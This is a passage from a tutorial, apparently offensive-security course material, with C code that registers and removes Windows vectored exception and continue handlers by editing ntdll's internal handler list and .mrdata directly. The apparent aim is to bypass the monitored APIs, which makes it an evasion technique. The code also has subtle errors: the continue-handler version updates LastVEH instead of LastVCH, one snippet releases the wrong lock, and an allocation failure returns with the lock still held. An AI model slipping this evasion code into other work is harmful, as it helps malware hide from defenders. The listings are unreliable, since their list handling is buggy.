if (!GetLdrProtectMrdata(hNtdll, &amp;pLdrProtectMrdata)) {
	printf("[!] Unable to Resolve LdrProtectMrdata \n");
	return NULL;
}

printf("[i] LdrProtectMrdata @ 0x%p \n", pLdrProtectMrdata);
</code></pre>
<br>
<h4>Checking If CFG Is Enabled</h4>
<p>To make our replacement functions work alongside CFG, a simple check is used with the previously constructed <code>CheckCFGStatus</code> function. When CFG is enabled, our replacement functions will utilize <code>LdrpMrdataHeap</code>
 instead of the process's default heap for storing vectored handler 
entries, thereby addressing potential issues that may occur when 
removing vectored handlers later.</p>
<pre><code class="language-C">BOOL	bCfg						= FALSE;
HANDLE	hHeap						= GetProcessHeap();
PVOID	pLdrpMrdataHeap				= NULL,
		pLdrEnsureMrdataHeapExists	= NULL;


// Query CFG status in our process
bCfg = CheckCFGStatus((HANDLE)-1);

if (bCfg) {

	printf("[i] CFG Enabled\n");

	// Resolving "RtlProtectHeap"
	if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddress(hNtdll, "RtlProtectHeap"))) {
		PRINT_WINAPI_ERR("GetProcAddress");
		return NULL;
	}

	// Resolving "LdrpMrdataHeap"
	if (!GetLdrpMrdataHeap(hNtdll, &amp;pLdrpMrdataHeap)) {
		printf("[!] Unable to Resolve LdrpMrdataHeap \n");
		return NULL;
	}

	// If "LdrpMrdataHeap" doesn't point to anything, it isn't present
	if (*(PVOID*)pLdrpMrdataHeap == NULL) {

		printf("[i] LdrpMrdataHeap Doesn't Exist, Creating it... \n");

		// Resolving the location of "LdrEnsureMrdataHeapExists"
		if (!GetLdrEnsureMrdataHeapExists(hNtdll, &amp;pLdrEnsureMrdataHeapExists)) {
			printf("[!] Error Resolving LdrEnsureMrdataHeapExists\n");
			return NULL;
		}

		// Calling the wrapper to allocate "LdrpMrdataHeap"
		LdrEnsureMrdataHeapExistsWrapper(pLdrEnsureMrdataHeapExists);
		printf("[i] LdrpMrdataHeap @ 0x%p =&gt; 0x%p\n", pLdrpMrdataHeap, *(PVOID*)pLdrpMrdataHeap);
	}

	// Use "LdrpMrdataHeap" to store our new entry we will add instead of the default process heap
	hHeap = *(PVOID*)pLdrpMrdataHeap;
	// Make it RW
	RtlProtectHeapWrapper(hHeap, FALSE, pRtlProtectHeap);
}
</code></pre>
<br>
<h4>Determining If the List Is Empty</h4>
<p>The registered vectored handlers are stored in a circular linked list, which means that <code>LdrpVectorHandlerList-&gt;FirstVEH</code>/<code>LdrpVectorHandlerList-&gt;LastVEH</code>
 point back to the start of the corresponding list when it's empty. 
Therefore, to determine if we don't have any entries, we'll do the 
following check:</p>
<pre><code class="language-C">BOOL	bEmpty			= FALSE;
PVOID	pVehListStart	= NULL;

// Acquire SRW lock to avoid a data race
AcquireSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

// LdrpVectorHandlerList + 0x8
pVehListStart = (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH);

bEmpty = (pLdrpVectorHandlerList-&gt;FirstVEH == pVehListStart) ? TRUE : FALSE; 

//Make .mrdata RW as we'll be editing it most likely later on
LdrProtectMrdataWrapper(FALSE, pLdrProtectMrdata);
</code></pre>
<img src="69_files/empty-list.png" style="margin:auto" width="1200px">
<p>The same logic applies to VCH, as can be seen from the picture showcasing <code>LdrpVectorHandlerList</code> for a process with no registered vectored handlers.</p>
<h4>Allocating a Vectored Handler Entry</h4>
<p>To add a new VEH/VCH handler, one should first create a new <code>VECTORED_HANDLER_ENTRY</code> entry, which is, by default, allocated on the default process heap (obtained via <code>GetProcessHeap</code>). However, if CFG is enabled, it will instead be allocated on <code>LdrpMrdataHeap</code>.</p>
<pre><code class="language-C">HANDLE					hHeap						= GetProcessHeap();
VECTORED_HANDLER_ENTRY*	pNewVectoredHandlerEntry	= NULL;
SIZE_T					sVectoredHandlerEntry		= sizeof(VECTORED_HANDLER_ENTRY);

&lt;SNIP&gt;

// Check if CFG is enabled
// If CFG is enabled, "hHeap" will hold the address of "LdrpMrdataHeap" instead of the default heap

&lt;SNIP&gt;

if (!(pNewVectoredHandlerEntry = (VECTORED_HANDLER_ENTRY*)HeapAlloc(hHeap, 0, sVectoredHandlerEntry))) {
	PRINT_WINAPI_ERR("HeapAlloc");
	return NULL;
}
</code></pre>
<br>
<h4>Inserting The New Handler Into LdrpVectorHandlerList</h4>
<p>In the case where the list is empty, the replacement functions set the <code>ProcessUsingVEH</code> (in <code>AddVectoredExceptionHandlerReplacement</code>) or <code>ProcessUsingVCH</code> (in <code>AddVectoredContinueHandlerReplacement</code>) bits by calling <code>FlipBit</code> with the <code>PROCESS_USING_VEH</code> and <code>PROCESS_USING_VCH</code>
 bitmask, respectively. Following this, the functions will complete the 
circular linked list by setting the new entrys forward and backward 
links to the start of the list and mark the new entry as the last 
element in the list.</p>
<p>If the list is not empty and the new entry should be inserted at the 
beginning. In this scenario, the new entrys forward link is set to the 
current first handler, and the original first handlers backward link is
 updated to point to the new entry.</p>
<p>Finally, in both situations (whether the list is empty or not), the 
replacement functions update the list so that the new entry becomes the 
first handler in <code>LdrpVectorHandlerList</code>.</p>
<pre><code class="language-C">if (bEmpty || bFirst) {

	printf("[i] Adding an Entry to the Start \n");

	if (bEmpty) {

		printf("[i] No VEH(s) Currently Registered, Setting ProcessUsingVEH Bit \n");

		// Set "ProcessUsingVEH" bit
		FlipBit(PROCESS_USING_VEH);

		// Complete the circular linked list
		pNewVectoredHandlerEntry-&gt;Entry.Flink = pVehListStart;
		pNewVectoredHandlerEntry-&gt;Entry.Blink = pVehListStart;

		// Since there are no other handlers, we are also the last entry in the list
		pLdrpVectorHandlerList-&gt;LastVEH = pNewVectoredHandlerEntry;
	}
	else {

		printf("[i] Pushing First Entry Down the List \n");

		// Our new entry needs to point to the original first handler
		pNewVectoredHandlerEntry-&gt;Entry.Flink = pLdrpVectorHandlerList-&gt;FirstVEH;

		// The original first handlers backwards link will need to point to our new entry instead of the start of the list
		pLdrpVectorHandlerList-&gt;FirstVEH-&gt;Entry.Blink = pNewVectoredHandlerEntry;
	}

	// Update the list so that our added entry is first
	pLdrpVectorHandlerList-&gt;FirstVEH = pNewVectoredHandlerEntry;
}
</code></pre>
<p>The following image showcases pushing the first entry down the list:</p>
<img src="69_files/insert-as-first.png" style="margin:auto" width="800px">
<p>On the other hand, if the list isn't empty, and the new vectored 
handler should be last, the following path is taken where the current 
last vectored handlers <code>Entry.Flink</code> is updated to point to our entry instead of the start of the <code>VEH</code> list. The new entries <code>Entry.Flink</code> will instead point to the start of the list to make the list layout valid.</p>
<pre><code class="language-C">if (bEmpty || bFirst) {
	&lt;SNIP&gt;
}
else {

	printf("[i] Adding an Entry to the End \n");

	// Get the last entry
	pVectoredHandlerEntry = pLdrpVectorHandlerList-&gt;LastVEH;

	// Instead of pointing back to the start of the list, point to us
	pVectoredHandlerEntry-&gt;Entry.Flink = pNewVectoredHandlerEntry;

	// Our entry is last, needs to point to the start
	pNewVectoredHandlerEntry-&gt;Entry.Flink = pVehListStart;

	// Make our entry point to the original last entry
	pNewVectoredHandlerEntry-&gt;Entry.Blink = pVectoredHandlerEntry;

	// Update the list
	pLdrpVectorHandlerList-&gt;LastVEH = pNewVectoredHandlerEntry;
}
</code></pre>
<br>
<img src="69_files/insert-as-last.png" style="margin:auto" width="800px">
<br>
<h4>Finishing Up</h4>
<p>The Final required action is to setup the reference counter and 
encode the pointer to the actual function we wish to register as a 
vectored handler. The memory protection of <code>.mrdata</code>, and if needed, <code>LdrpMrdataHeap</code>, will be marked as "Read-Only" again.</p>
<pre><code class="language-C">// Release the VEH lock
ReleaseSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVCH);

// Revert .mrdata protection (make R/O)
LdrProtectMrdataWrapper(TRUE, pLdrProtectMrdata);

pNewVectoredHandlerEntry-&gt;Refs = &amp;g_Ref; // Global variable in our program, can also use a counter from an existing entry
pNewVectoredHandlerEntry-&gt;VectoredHandler = EncodePointer(pHandlerFunction);

if (bCfg) {
	RtlProtectHeapWrapper(hHeap, TRUE, pRtlProtectHeap);
}

printf("[+] Entry Successfully Added @ 0x%p \n", pNewVectoredHandlerEntry);

return pNewVectoredHandlerEntry;
</code></pre>
<br>
<h4>Full AddVectoredExceptionHandlerReplacement Code</h4>
<p>The <code>AddVectoredExceptionHandlerReplacement</code> function is shown below, where it takes two parameters:</p>
<ul>
<li>
<p><code>bFirst</code> - A boolean that specifies whether the new vectored handler should be inserted at the beginning of its list.</p>
</li>
<li>
<p><code>pHandlerFunction</code> - A pointer to the function that will be registered as a vectored handler.</p>
</li>
</ul>
<pre><code class="language-C">PVOID AddVectoredExceptionHandlerReplacement(IN BOOL bFirst, IN PVOID pHandlerFunction) {

	BOOL					bEmpty						= FALSE,
							bCfg						= FALSE;
	HANDLE					hHeap						= GetProcessHeap();
	PVOID					pVehListStart				= NULL,
							pLdrpMrdataHeap				= NULL,
							pLdrEnsureMrdataHeapExists	= NULL;
	VECTORED_HANDLER_ENTRY*	pNewVectoredHandlerEntry	= NULL;
	VECTORED_HANDLER_ENTRY*	pVectoredHandlerEntry		= NULL;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList		= NULL;
	fnLdrProtectMrdata		pLdrProtectMrdata			= NULL;
	fnRtlProtectHeap		pRtlProtectHeap				= NULL;
	SIZE_T					sVectoredHandlerEntry		= sizeof(VECTORED_HANDLER_ENTRY);

	HMODULE					hNtdll = GetModuleHandle(TEXT("NTDLL.DLL"));

	if (!pHandlerFunction)
		return NULL;

	if (!GetVectoredHandlerList(hNtdll, &amp;pLdrpVectorHandlerList)) {
		printf("[!] Failed to Get LdrpVectorHandlerList \n");
		return NULL;
	}

	printf("[i] LdrpVectorHandlerList @ 0x%p\n", pLdrpVectorHandlerList);

	if (!GetLdrProtectMrdata(hNtdll, &amp;pLdrProtectMrdata)) {
		printf("[!] Unable to Resolve LdrProtectMrdata \n");
		return NULL;
	}

	printf("[i] LdrProtectMrdata @ 0x%p \n", pLdrProtectMrdata);

	bCfg = CheckCFGStatus((HANDLE)-1);

	if (bCfg) {

		printf("[i] CFG Enabled\n");

		if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddress(hNtdll, "RtlProtectHeap"))) {
			PRINT_WINAPI_ERR("GetProcAddress");
			return NULL;
		}

		if (!GetLdrpMrdataHeap(hNtdll, &amp;pLdrpMrdataHeap)) {
			printf("[!] Unable to Resolve LdrpMrdataHeap \n");
			return NULL;
		}

		if (*(PVOID*)pLdrpMrdataHeap == NULL) {

			printf("[i] LdrpMrdataHeap Doesn't Exist, Creating it... \n");

			if (!GetLdrEnsureMrdataHeapExists(hNtdll, &amp;pLdrEnsureMrdataHeapExists)) {
				printf("[!] Error Resolving LdrEnsureMrdataHeapExists\n");
				return NULL;
			}

			LdrEnsureMrdataHeapExistsWrapper(pLdrEnsureMrdataHeapExists);
			printf("[i] LdrpMrdataHeap @ 0x%p =&gt; 0x%p\n", pLdrpMrdataHeap, *(PVOID*)pLdrpMrdataHeap);
		}

		hHeap = *(PVOID*)pLdrpMrdataHeap;
		RtlProtectHeapWrapper(hHeap, FALSE, pRtlProtectHeap);
	}

	// Acquire the VEH list lock
	AcquireSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

	pVehListStart = (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH);

	//Make .mrdata RW
	LdrProtectMrdataWrapper(FALSE, pLdrProtectMrdata);

	//if first entry is pointing back towards the start of the list, it's empty
	bEmpty = (pLdrpVectorHandlerList-&gt;FirstVEH == pVehListStart) ? TRUE : FALSE;

	if (!(pNewVectoredHandlerEntry = (VECTORED_HANDLER_ENTRY*)HeapAlloc(hHeap, 0, sVectoredHandlerEntry))) {
		PRINT_WINAPI_ERR("HeapAlloc");
		return NULL;
	}

	//If list is empty, or we want our handler to be first when there are handlers already registered, edit .mrdata
	if (bEmpty || bFirst) {

		printf("[i] Adding an Entry to the Start \n");

		if (bEmpty) {

			printf("[i] No VEH(s) Currently Registered, Setting ProcessUsingVEH Bit \n");

			FlipBit(PROCESS_USING_VEH);
			pNewVectoredHandlerEntry-&gt;Entry.Flink = pVehListStart;
			pNewVectoredHandlerEntry-&gt;Entry.Blink = pVehListStart;

			pLdrpVectorHandlerList-&gt;LastVEH = pNewVectoredHandlerEntry;
		}
		else {

			printf("[i] Pushing First Entry Down the List \n");

			pNewVectoredHandlerEntry-&gt;Entry.Flink = pLdrpVectorHandlerList-&gt;FirstVEH;
			pLdrpVectorHandlerList-&gt;FirstVEH-&gt;Entry.Blink = pNewVectoredHandlerEntry;
		}

		//Update the list so that our added entry is first
		pLdrpVectorHandlerList-&gt;FirstVEH = pNewVectoredHandlerEntry;
	}
	else {

		printf("[i] Adding an Entry to the End \n");

		// Get the last entry
		pVectoredHandlerEntry = pLdrpVectorHandlerList-&gt;LastVEH;

		// Instead of pointing back to the start of the list, point to us
		pVectoredHandlerEntry-&gt;Entry.Flink = pNewVectoredHandlerEntry;

		// Our entry is last, needs to point to the start
		pNewVectoredHandlerEntry-&gt;Entry.Flink = pVehListStart;

		// Make our entry point to the original last entry
		pNewVectoredHandlerEntry-&gt;Entry.Blink = pVectoredHandlerEntry;

		// Update the list
		pLdrpVectorHandlerList-&gt;LastVEH = pNewVectoredHandlerEntry;
	}

	// Release the VEH lock
	ReleaseSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

	// Revert .mrdata protection (make R/O)
	LdrProtectMrdataWrapper(TRUE, pLdrProtectMrdata);

	pNewVectoredHandlerEntry-&gt;Refs = &amp;g_Ref;
	pNewVectoredHandlerEntry-&gt;VectoredHandler = EncodePointer(pHandlerFunction);

	if (bCfg) {
		RtlProtectHeapWrapper(hHeap, TRUE, pRtlProtectHeap);
	}

	printf("[+] Entry Successfully Added @ 0x%p \n", pNewVectoredHandlerEntry);

	return pNewVectoredHandlerEntry;
}
</code></pre>
<br>
<h4>Complete AddVectoredContinueHandlerReplacement Code</h4>
<p>The <code>AddVectoredContinueHandlerReplacement</code> follows the same principle as its <code>VEH</code> counterpart. The only things that are changed are the members used. The <code>AddVectoredContinueHandlerReplacement</code> function is shown below, where it takes two parameters:</p>
<ul>
<li>
<p><code>bFirst</code> - A boolean that specifies whether the new vectored handler should be inserted at the beginning of its list.</p>
</li>
<li>
<p><code>pHandlerFunction</code> - A pointer to the function that will be registered as a vectored handler.</p>
</li>
</ul>
<pre><code class="language-C">PVOID AddVectoredContinueHandlerReplacement(IN BOOL bFirst, IN PVOID pHandlerFunction) {

	BOOL					bEmpty						= FALSE,
							bCfg						= FALSE;
	HANDLE					hHeap						= GetProcessHeap();
	PVOID					pVchListStart				= NULL,
							pLdrpMrdataHeap				= NULL,
							pLdrEnsureMrdataHeapExists	= NULL;
	VECTORED_HANDLER_ENTRY*	pNewVectoredHandlerEntry	= NULL;
	VECTORED_HANDLER_ENTRY*	pVectoredHandlerEntry		= NULL;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList		= NULL;
	fnLdrProtectMrdata		pLdrProtectMrdata			= NULL;
	fnRtlProtectHeap		pRtlProtectHeap				= NULL;
	SIZE_T					sVectoredHandlerEntry		= sizeof(VECTORED_HANDLER_ENTRY);

	HMODULE					hNtdll = GetModuleHandle(TEXT("NTDLL.DLL"));

	if (!pHandlerFunction)
		return NULL;

	if (!GetVectoredHandlerList(hNtdll, &amp;pLdrpVectorHandlerList)) {
		printf("[!] Failed to Get LdrpVectorHandlerList \n");
		return NULL;
	}

	printf("[i] LdrpVectorHandlerList @ 0x%p\n", pLdrpVectorHandlerList);

	if (!GetLdrProtectMrdata(hNtdll, &amp;pLdrProtectMrdata)) {
		printf("[!] Unable to Resolve LdrProtectMrdata \n");
		return NULL;
	}

	printf("[i] LdrProtectMrdata @ 0x%p \n", pLdrProtectMrdata);

	bCfg = CheckCFGStatus((HANDLE)-1);

	if (bCfg) {

		printf("[i] CFG Enabled\n");

		if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddress(hNtdll, "RtlProtectHeap"))) {
			PRINT_WINAPI_ERR("GetProcAddress");
			return NULL;
		}

		if (!GetLdrpMrdataHeap(hNtdll, &amp;pLdrpMrdataHeap)) {
			printf("[!] Unable to Resolve LdrpMrdataHeap \n");
			return NULL;
		}

		if (*(PVOID*)pLdrpMrdataHeap == NULL) {

			printf("[i] LdrpMrdataHeap Doesn't Exist, Creating it... \n");

			if (!GetLdrEnsureMrdataHeapExists(hNtdll, &amp;pLdrEnsureMrdataHeapExists)) {
				printf("[!] Error Resolving LdrEnsureMrdataHeapExists\n");
				return NULL;
			}

			LdrEnsureMrdataHeapExistsWrapper(pLdrEnsureMrdataHeapExists);
			printf("[i] LdrpMrdataHeap @ 0x%p =&gt; 0x%p\n", pLdrpMrdataHeap, *(PVOID*)pLdrpMrdataHeap);
		}

		hHeap = *(PVOID*)pLdrpMrdataHeap;
		RtlProtectHeapWrapper(hHeap, FALSE, pRtlProtectHeap);
	}

	// Acquire the VEH list lock
	AcquireSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVCH);

	pVchListStart = (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVCH);

	//Make .mrdata RW
	LdrProtectMrdataWrapper(FALSE, pLdrProtectMrdata);

	//if first entry is pointing back towards the start of the list, it's empty
	bEmpty = (pLdrpVectorHandlerList-&gt;FirstVCH == pVchListStart) ? TRUE : FALSE;

	if (!(pNewVectoredHandlerEntry = (VECTORED_HANDLER_ENTRY*)HeapAlloc(hHeap, 0, sVectoredHandlerEntry))) {
		PRINT_WINAPI_ERR("HeapAlloc");
		return NULL;
	}

	//If list is empty, or we want our handler to be first when there are handlers already registered, edit .mrdata
	if (bEmpty || bFirst) {

		printf("[i] Adding an Entry to the Start \n");

		if (bEmpty) {

			printf("[i] No VCH(s) Currently Registered, Setting ProcessUsingVCH Bit \n");

			FlipBit(PROCESS_USING_VCH);
			pNewVectoredHandlerEntry-&gt;Entry.Flink = pVchListStart;
			pNewVectoredHandlerEntry-&gt;Entry.Blink = pVchListStart;

			pLdrpVectorHandlerList-&gt;LastVCH = pNewVectoredHandlerEntry;
		}
		else {

			printf("[i] Pushing First Entry Down the List \n");

			pNewVectoredHandlerEntry-&gt;Entry.Flink = pLdrpVectorHandlerList-&gt;FirstVCH;
			pLdrpVectorHandlerList-&gt;FirstVCH-&gt;Entry.Blink = pNewVectoredHandlerEntry;
		}

		//Update the list so that our added entry is first
		pLdrpVectorHandlerList-&gt;FirstVCH = pNewVectoredHandlerEntry;
	}
	else {

		printf("[i] Adding an Entry to the End \n");

		// Get the last entry
		pVectoredHandlerEntry = pLdrpVectorHandlerList-&gt;LastVCH;

		// Instead of pointing back to the start of the list, point to us
		pVectoredHandlerEntry-&gt;Entry.Flink = pNewVectoredHandlerEntry;

		// Our entry is last, needs to point to the start
		pNewVectoredHandlerEntry-&gt;Entry.Flink = pVchListStart;

		// Make our entry point to the original last entry
		pNewVectoredHandlerEntry-&gt;Entry.Blink = pVectoredHandlerEntry;

		// Update the list
		pLdrpVectorHandlerList-&gt;LastVEH = pNewVectoredHandlerEntry;
	}

	// Release the VEH lock
	ReleaseSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVCH);

	// Revert .mrdata protection (make R/O)
	LdrProtectMrdataWrapper(TRUE, pLdrProtectMrdata);

	pNewVectoredHandlerEntry-&gt;Refs = &amp;g_Ref;
	pNewVectoredHandlerEntry-&gt;VectoredHandler = EncodePointer(pHandlerFunction);

	if (bCfg) {
		RtlProtectHeapWrapper(hHeap, TRUE, pRtlProtectHeap);
	}

	printf("[+] Entry Successfully Added @ 0x%p \n", pNewVectoredHandlerEntry);

	return pNewVectoredHandlerEntry;
}
</code></pre>
<br>
<h3>RemoveVectoredExceptionHandlerReplacement And RemoveVectoredContinueHandlerReplacement Functions</h3>
<p>The provided implementation also includes custom functions for <code>RemoveVectoredExceptionHandler</code> and <code>RemoveVectoredContinueHandler</code>. These functions follow the below steps:</p>
<ol>
<li>
<p>Resolve the address of <code>LdrpVectorHandlerList</code>.</p>
</li>
<li>
<p>Resolve the address of <code>LdrProtectMrdata</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrEnsureMrdataHeapExists</code>.</p>
</li>
<li>
<p>Acquire exclusive access to the corresponding lock and locate the <code>VECTORED_HANDLER_ENTRY</code>.</p>
</li>
<li>
<p>Unprotect (remove the RO memory protection) <code>.mrdata</code> and, if CFG is active, unprotect <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>Unlink the entry and update <code>PEB.CrossProcessFlags</code> if the list becomes empty.</p>
</li>
<li>
<p>Free the <code>VECTORED_HANDLER_ENTRY</code> from the appropriate heap.</p>
</li>
<li>
<p>Re-protect <code>.mrdata</code> and <code>LdrpMrdataHeap</code> if needed.</p>
</li>
<li>
<p>Release the lock.</p>
</li>
</ol>
<h4>Full RemoveVectoredExceptionHandlerReplacement Function</h4>
<p>The <code>RemoveVectoredExceptionHandlerReplacement</code> function is shown below, where it accepts the following parameters:</p>
<ul>
<li><code>pHandlerEntry</code> - A pointer to the VEH entry to be removed.</li>
</ul>
<pre><code class="language-c">BOOL RemoveVectoredExceptionHandlerReplacement(IN PVOID pHandlerEntry) {

	BOOL					bCfg					= FALSE,
							bUnprotected			= FALSE,
							bSuccess				= FALSE;
	PVOID					pVehListStart			= NULL;
	HANDLE					hHeap					= GetProcessHeap();
	VECTORED_HANDLER_ENTRY*	pVectoredHandlerEntry	= NULL;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList	= NULL;
	fnLdrProtectMrdata		pLdrProtectMrdata		= NULL;
	fnRtlProtectHeap		pRtlProtectHeap			= NULL;

	HMODULE					hNtdll = GetModuleHandle(TEXT("NTDLL.DLL"));

	if (!pHandlerEntry)
		return FALSE;

	if (!GetVectoredHandlerList(hNtdll, &amp;pLdrpVectorHandlerList)) {
		printf("[!] Failed to Get LdrpVectorHandlerList \n");
		return FALSE;
	}

	if (!GetLdrProtectMrdata(hNtdll, &amp;pLdrProtectMrdata)) {
		printf("[!] Unable to Resolve LdrProtectMrdata \n");
		return FALSE;
	}

	if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddress(hNtdll, "RtlProtectHeap"))) {
		PRINT_WINAPI_ERR("GetProcAddress");
		return FALSE;
	}

	pVehListStart = (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH);

	AcquireSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

	pVectoredHandlerEntry = pLdrpVectorHandlerList-&gt;FirstVEH;

	while (pVectoredHandlerEntry != pVehListStart) {

		if (pVectoredHandlerEntry == pHandlerEntry) {

			LdrProtectMrdataWrapper(FALSE, pLdrProtectMrdata);
			bUnprotected = TRUE;

			bCfg = CheckCFGStatus((HANDLE)-1);

			if (bCfg) {

				// If CFG is enabled, entries are at the start of LdrpMrdataHeap
				// Align address down to get the base of LdrpMrdataHeap
				hHeap = PAGE_ALIGN_DOWN(pVectoredHandlerEntry);
				RtlProtectHeapWrapper(hHeap, FALSE, pRtlProtectHeap);
			}

			// Check if single entry
			if (pLdrpVectorHandlerList-&gt;FirstVEH == pLdrpVectorHandlerList-&gt;LastVEH) {

				pLdrpVectorHandlerList-&gt;FirstVEH = pVehListStart;
				pLdrpVectorHandlerList-&gt;LastVEH = pVehListStart;
				FlipBit(PROCESS_USING_VEH);
			}
			else {

				// Check if first entry
				if (pVectoredHandlerEntry-&gt;Entry.Blink == pVehListStart) {

					// Update the start to point to the next entry in the entry we are removing
					pLdrpVectorHandlerList-&gt;FirstVEH = pVectoredHandlerEntry-&gt;Entry.Flink;

					// Update the backwards link in our forwards entry
					((VECTORED_HANDLER_ENTRY*)pVectoredHandlerEntry-&gt;Entry.Flink)-&gt;Entry.Blink = pVehListStart;
				}
				else {

					// Check if last entry
					if (pVectoredHandlerEntry-&gt;Entry.Flink == pVehListStart) {

						// Update LastVEH to point to our entries backwards link
						pLdrpVectorHandlerList-&gt;LastVEH = pVectoredHandlerEntry-&gt;Entry.Blink;
					}
					else {
						// Update the backwards link in our forwards entry to point to our backwards link instead of us
						((VECTORED_HANDLER_ENTRY*)pVectoredHandlerEntry-&gt;Entry.Flink)-&gt;Entry.Blink = pVectoredHandlerEntry-&gt;Entry.Blink;
					}

					// Update the forwards link in our backwards entry to point to our forwards link instead of us
					((VECTORED_HANDLER_ENTRY*)pVectoredHandlerEntry-&gt;Entry.Blink)-&gt;Entry.Flink = pVectoredHandlerEntry-&gt;Entry.Flink;
				}
			}

			ZeroMemory(pVectoredHandlerEntry, sizeof(VECTORED_HANDLER_ENTRY));
			HeapFree(hHeap, 0, pVectoredHandlerEntry);

			printf("[+] Removed Handler Entry @ 0x%p\n", pHandlerEntry);

			bSuccess = TRUE;
			break;
		}

		pVectoredHandlerEntry = pVectoredHandlerEntry-&gt;Entry.Flink;
	}

	if (bUnprotected)
		LdrProtectMrdataWrapper(TRUE, pLdrProtectMrdata);

	ReleaseSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

	if (bCfg)
		RtlProtectHeapWrapper(hHeap, TRUE, pRtlProtectHeap);

	return bSuccess;
}
</code></pre>
<br>
<h4>Full RemoveVectoredContinueHandlerReplacement Function</h4>
<p>The <code>RemoveVectoredContinueHandlerReplacement</code> function 
shares the same prototype as its VEH counterpart; the only difference 
lies in which members are inspected and modified. <code>RemoveVectoredContinueHandlerReplacement</code> is listed below, accepting a single parameter:</p>
<ul>
<li><code>pHandlerEntry</code> - A pointer to the VCH entry to be removed.</li>
</ul>
<pre><code class="language-C">BOOL RemoveVectoredContinueHandlerReplacement(IN PVOID pHandlerEntry) {

	BOOL					bCfg					= FALSE,
							bUnprotected			= FALSE,
							bSuccess				= FALSE;
	PVOID					pVchListStart			= NULL;
	HANDLE					hHeap					= GetProcessHeap();
	VECTORED_HANDLER_ENTRY*	pVectoredHandlerEntry	= NULL;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList	= NULL;
	fnLdrProtectMrdata		pLdrProtectMrdata		= NULL;
	fnRtlProtectHeap		pRtlProtectHeap			= NULL;

	HMODULE					hNtdll = GetModuleHandle(TEXT("NTDLL.DLL"));

	if (!pHandlerEntry)
		return FALSE;

	if (!GetVectoredHandlerList(hNtdll, &amp;pLdrpVectorHandlerList)) {
		printf("[!] Failed to Get LdrpVectorHandlerList \n");
		return FALSE;
	}

	if (!GetLdrProtectMrdata(hNtdll, &amp;pLdrProtectMrdata)) {
		printf("[!] Unable to Resolve LdrProtectMrdata \n");
		return FALSE;
	}

	if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddress(hNtdll, "RtlProtectHeap"))) {
		PRINT_WINAPI_ERR("GetProcAddress");
		return FALSE;
	}

	pVchListStart = (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVCH);

	AcquireSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVCH);

	pVectoredHandlerEntry = pLdrpVectorHandlerList-&gt;FirstVCH;

	while (pVectoredHandlerEntry != pVchListStart) {

		if (pVectoredHandlerEntry == pHandlerEntry) {

			LdrProtectMrdataWrapper(FALSE, pLdrProtectMrdata);
			bUnprotected = TRUE;

			bCfg = CheckCFGStatus((HANDLE)-1);

			if (bCfg) {

				// If CFG is enabled, entries are at the start of LdrpMrdataHeap
				// Align address down to get the base of LdrpMrdataHeap
				hHeap = PAGE_ALIGN_DOWN(pVectoredHandlerEntry);
				RtlProtectHeapWrapper(hHeap, FALSE, pRtlProtectHeap);
			}

			// Check if single entry in the list
			if (pLdrpVectorHandlerList-&gt;FirstVCH == pLdrpVectorHandlerList-&gt;LastVCH) {

				pLdrpVectorHandlerList-&gt;FirstVCH = pVchListStart;
				pLdrpVectorHandlerList-&gt;LastVCH = pVchListStart;
				FlipBit(PROCESS_USING_VCH);
			}
			else {

				// Check if first entry
				if (pVectoredHandlerEntry-&gt;Entry.Blink == pVchListStart) {

					// Update the start to point to the next entry in the entry we are removing
					pLdrpVectorHandlerList-&gt;FirstVCH = pVectoredHandlerEntry-&gt;Entry.Flink;

					// Update the backwards link in our forwards entry
					((VECTORED_HANDLER_ENTRY*)pVectoredHandlerEntry-&gt;Entry.Flink)-&gt;Entry.Blink = pVchListStart;
				}
				else {

					// Check if last entry
					if (pVectoredHandlerEntry-&gt;Entry.Flink == pVchListStart) {

						// Update LastVCH to point to our entries backwards link
						pLdrpVectorHandlerList-&gt;LastVCH = pVectoredHandlerEntry-&gt;Entry.Blink;
					}
					else {
						// Update the backwards link in our forwards entry to point to our backwards link instead of us
						((VECTORED_HANDLER_ENTRY*)pVectoredHandlerEntry-&gt;Entry.Flink)-&gt;Entry.Blink = pVectoredHandlerEntry-&gt;Entry.Blink;
					}

					// Update the forwards link in our backwards entry to point to our forwards link instead of us
					((VECTORED_HANDLER_ENTRY*)pVectoredHandlerEntry-&gt;Entry.Blink)-&gt;Entry.Flink = pVectoredHandlerEntry-&gt;Entry.Flink;
				}
			}

			ZeroMemory(pVectoredHandlerEntry, sizeof(VECTORED_HANDLER_ENTRY));
			HeapFree(hHeap, 0, pVectoredHandlerEntry);

			printf("[+] Removed Handler Entry @ 0x%p\n", pHandlerEntry);

			bSuccess = TRUE;
			break;
		}

		pVectoredHandlerEntry = pVectoredHandlerEntry-&gt;Entry.Flink;
	}

	if (bUnprotected)
		LdrProtectMrdataWrapper(TRUE, pLdrProtectMrdata);

